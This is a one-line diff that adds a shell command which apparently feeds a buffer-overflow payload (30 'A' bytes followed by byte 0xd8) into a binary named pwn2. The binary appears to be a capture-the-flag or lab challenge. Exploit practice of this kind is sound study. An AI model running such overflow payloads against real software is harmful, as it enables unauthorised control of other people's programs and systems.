@@ -1,0 +1,1 @@
+python -c 'print "A" * 30 + "\xd8"' | ./pwn2
